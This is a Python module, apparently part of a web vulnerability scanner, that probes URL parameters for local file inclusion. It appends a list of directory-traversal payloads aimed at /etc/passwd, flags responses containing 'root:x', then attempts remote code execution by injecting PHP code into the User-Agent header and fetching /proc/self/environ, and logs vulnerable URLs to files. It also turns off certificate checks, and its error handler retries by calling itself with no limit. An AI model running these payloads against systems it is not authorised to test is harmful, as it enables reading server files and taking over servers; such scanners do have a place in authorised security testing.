from engine import *
from sess import *
from log import *

from urllib3.exceptions import InsecureRequestWarning
from urllib3 import disable_warnings
disable_warnings(InsecureRequestWarning)

payloads = ['etc/passwd','../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',
            '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd']


class lfi:

    def __init__(self):
        self.proxy_type = 0
        self.headers = ''

    # set information function like others class for proxy and headers
    def setInfo(self,headers,proxy_type):
        self.proxy_type = proxy_type
        self.headers = headers

    # in LFI we're checking get method for LFI vulnerability

    def lfi_get(self,url: str):

        sess = self.sess()

        # we need to at-least one param for sending LFI payload, and that's checking it
        if '=' not in url:
            return

        Log.warning("Found link GET Method: " + url)

        # Skip mailto and tel protocol too
        if not url.startswith("mailto:") and not url.startswith("tel:"):

            for payload in payloads:
                try:
                    req = sess.get(url + payload, verify=False)

                    # checks is that has vulnerability or not
                    if  'root:x' in req.text:
                        Log.high("Detected LFI at " + req.url)
                        file = open("lfi.txt", "a+")
                        file.write(str(req.url) + "\n")
                        file.close()

                        ########### RCE IN LFI ###########

                        # this is extra step
                        # in some cases, we can get access to RCE one too,
                        # so we are checking it by these lines

                        rce = req.url.replace('/etc/passwd','/proc/self/environ')
                        sess.headers.update({'user-agent':'<? echo md5(UT); ?>'})
                        rce_req = sess.get(rce,verify=False)

                        # that will use md5 function and if that md5 worked, it means we have access to their server,
                        # we used UT as string for md5 and the exact value of md5 encrypted UT string is :
                        # 87db16cba59e908888837d351af65bfe so its simple, if that hash (87db16cba59e908888837d351af65bfe)
                        # exists to our page, we can confrim we have acess to their server by RCE vulnerability

                        if '87db16cba59e908888837d351af65bfe' in rce_req.text:
                            Log.high("Detected RCE in LFI at " + rce_req.url)
                            file = open("rce_in_lfi.txt", "a+")
                            file.write(str(req.url) + "\n")
                            file.close()

                        break
                except requests.exceptions.RequestException or requests.exceptions.ConnectionError or requests.exceptions.ProxyError:
                    self.lfi_get(url)




        else:
            pass


    def sess(self):

        if self.proxy_type == 4:
            session = sess(self.headers)

        else:
            session = sessProxy(self.headers,self.proxy_type)

        return session